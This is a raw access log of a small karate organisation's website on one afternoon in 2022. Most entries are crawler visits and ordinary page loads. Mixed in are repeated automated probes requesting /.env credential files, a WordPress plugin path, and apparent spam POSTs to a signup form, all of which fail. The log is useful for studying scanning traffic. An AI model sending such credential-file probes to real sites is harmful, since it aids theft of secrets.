::ffff:106.75.28.105 - - [20/Aug/2022:13:11:15 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3"
::ffff:106.75.28.105 - - [20/Aug/2022:13:11:18 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3"
::ffff:106.75.28.105 - - [20/Aug/2022:13:11:37 +0000] "GET /sitemap.xml HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3"
::ffff:106.75.28.105 - - [20/Aug/2022:13:11:37 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3"
::ffff:165.154.6.176 - - [20/Aug/2022:13:16:26 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17"
::ffff:165.154.6.176 - - [20/Aug/2022:13:16:27 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17"
::ffff:165.154.6.176 - - [20/Aug/2022:13:16:27 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17"
::ffff:165.154.6.176 - - [20/Aug/2022:13:16:28 +0000] "GET /sitemap.xml HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17"
::ffff:165.154.6.176 - - [20/Aug/2022:13:16:28 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17"
::ffff:207.46.13.182 - - [20/Aug/2022:13:20:53 +0000] "GET /images/igpic.webp HTTP/1.1" 200 1328 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:194.38.20.161 - - [20/Aug/2022:13:21:13 +0000] "GET /wp-content/plugins/simple-ads-manager/css/jslider.round.plastic.css HTTP/1.1" 404 206 "-" "ALittle Client"
::ffff:141.98.11.33 - - [20/Aug/2022:13:29:53 +0000] "GET / HTTP/1.1" 200 58071 "-" "Hello World"
::ffff:185.254.196.115 - - [20/Aug/2022:13:36:16 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [20/Aug/2022:13:36:17 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.65.199 - - [20/Aug/2022:13:44:02 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.199 - - [20/Aug/2022:13:44:02 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.197 - - [20/Aug/2022:13:44:05 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.197 - - [20/Aug/2022:13:44:05 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.69.28 - - [20/Aug/2022:13:46:20 +0000] "GET /events HTTP/1.1" 200 7258 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.244.48 - - [20/Aug/2022:13:50:04 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [20/Aug/2022:13:50:04 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/JohnArce.jpg HTTP/1.1" 200 13951 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 200 15317 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/MBS.gif HTTP/1.1" 200 13195 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 200 3760 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/KarateDoZen.jpg HTTP/1.1" 200 2677 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/dummies.jpg HTTP/1.1" 200 3631 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/dojoWisdom.jpg HTTP/1.1" 200 2813 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/saibook.jpg HTTP/1.1" 200 3043 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/bobook.gif HTTP/1.1" 200 6919 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/guide20.jpg HTTP/1.1" 200 1934 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 200 3442 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/emptyHand.jpg HTTP/1.1" 200 12021 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 200 3578 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/books/grappingmethod.jpg HTTP/1.1" 200 4025 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:19 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:23 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:13:51:44 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:128.14.134.134 - - [20/Aug/2022:13:52:31 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:99.167.203.90 - - [20/Aug/2022:13:55:32 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:207.46.13.74 - - [20/Aug/2022:14:03:37 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:167.94.138.61 - - [20/Aug/2022:14:05:12 +0000] "GET / HTTP/1.1" 200 58071 "-" "-"
::ffff:167.94.138.61 - - [20/Aug/2022:14:05:12 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.138.61 - - [20/Aug/2022:14:05:12 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:99.167.203.90 - - [20/Aug/2022:14:05:52 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:14:05:56 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:14:06:03 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:157.55.39.86 - - [20/Aug/2022:14:09:44 +0000] "GET /videos.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:40.77.167.96 - - [20/Aug/2022:14:15:45 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.74 - - [20/Aug/2022:14:15:48 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:99.167.203.90 - - [20/Aug/2022:14:20:07 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:46.161.11.238 - - [20/Aug/2022:14:20:55 +0000] "GET / HTTP/1.0" 200 58071 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4089.0 Safari/537.36"
::ffff:46.161.11.238 - - [20/Aug/2022:14:20:56 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4089.0 Safari/537.36"
::ffff:46.161.11.238 - - [20/Aug/2022:14:20:56 +0000] "GET /?err=error HTTP/1.0" 200 58623 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4089.0 Safari/537.36"
::ffff:66.249.69.28 - - [20/Aug/2022:14:31:20 +0000] "GET /joinemail?type=tournaments HTTP/1.1" 200 8829 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:51.222.253.6 - - [20/Aug/2022:14:32:01 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.9 - - [20/Aug/2022:14:32:02 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:54.218.145.3 - - [20/Aug/2022:14:32:38 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:54.186.202.35 - - [20/Aug/2022:14:33:46 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.209.81.135 - - [20/Aug/2022:14:34:43 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.209.81.135 - - [20/Aug/2022:14:34:45 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:66.249.65.19 - - [20/Aug/2022:14:37:36 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.19 - - [20/Aug/2022:14:37:36 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:34.213.166.83 - - [20/Aug/2022:14:38:03 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.89.92.62 - - [20/Aug/2022:14:43:17 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.89.92.62 - - [20/Aug/2022:14:43:19 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.210.140.148 - - [20/Aug/2022:14:43:59 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.210.140.148 - - [20/Aug/2022:14:43:59 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:157.55.39.26 - - [20/Aug/2022:14:44:08 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:162.62.191.231 - - [20/Aug/2022:14:52:26 +0000] "GET / HTTP/1.1" 200 58071 "-" "curl/7.64.1"
::ffff:205.185.121.69 - - [20/Aug/2022:14:52:33 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:205.185.121.69 - - [20/Aug/2022:14:52:33 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
::ffff:185.254.196.115 - - [20/Aug/2022:15:04:52 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [20/Aug/2022:15:04:55 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:46.161.11.227 - - [20/Aug/2022:15:06:17 +0000] "GET / HTTP/1.0" 200 58071 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:46.161.11.227 - - [20/Aug/2022:15:06:17 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:46.161.11.227 - - [20/Aug/2022:15:06:18 +0000] "GET /?err=error HTTP/1.0" 200 58623 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:66.249.69.26 - - [20/Aug/2022:15:16:20 +0000] "GET /schools HTTP/1.1" 200 96626 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.244.48 - - [20/Aug/2022:15:22:46 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [20/Aug/2022:15:22:46 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:207.46.13.197 - - [20/Aug/2022:15:24:23 +0000] "GET /images/instructors/rodnak.jpg HTTP/1.1" 200 12841 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.65.199 - - [20/Aug/2022:15:31:10 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:193.56.29.140 - - [20/Aug/2022:15:46:02 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:193.56.29.140 - - [20/Aug/2022:15:46:03 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.69.28 - - [20/Aug/2022:16:01:20 +0000] "GET /events HTTP/1.1" 200 7258 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.74 - - [20/Aug/2022:16:05:59 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:99.167.203.90 - - [20/Aug/2022:16:08:12 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:99.167.203.90 - - [20/Aug/2022:16:08:15 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org./resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
::ffff:207.46.13.74 - - [20/Aug/2022:16:18:19 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:46.161.11.238 - - [20/Aug/2022:16:28:56 +0000] "GET / HTTP/1.0" 200 58071 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.24 Safari/537.36 Edg/83.0.478.18"
::ffff:46.161.11.238 - - [20/Aug/2022:16:28:57 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.24 Safari/537.36 Edg/83.0.478.18"
::ffff:46.161.11.238 - - [20/Aug/2022:16:28:57 +0000] "GET /?err=error HTTP/1.0" 200 58623 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.24 Safari/537.36 Edg/83.0.478.18"
::ffff:40.88.21.235 - - [20/Aug/2022:16:29:58 +0000] "GET / HTTP/1.1" 200 58071 "http://wadokikai.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:40.88.21.235 - - [20/Aug/2022:16:29:58 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/images/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:185.254.196.115 - - [20/Aug/2022:16:38:16 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [20/Aug/2022:16:38:16 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.13 - - [20/Aug/2022:16:47:00 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [20/Aug/2022:16:47:01 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [20/Aug/2022:16:47:02 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.12 - - [20/Aug/2022:16:47:02 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:207.46.13.74 - - [20/Aug/2022:16:52:02 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.86 - - [20/Aug/2022:16:52:19 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.113 - - [20/Aug/2022:16:52:20 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:135.125.244.48 - - [20/Aug/2022:16:54:32 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [20/Aug/2022:16:54:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.65.195 - - [20/Aug/2022:17:18:19 +0000] "GET /signup.html HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:46.161.11.227 - - [20/Aug/2022:17:18:39 +0000] "GET / HTTP/1.0" 200 58071 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4087.0 Safari/537.36"
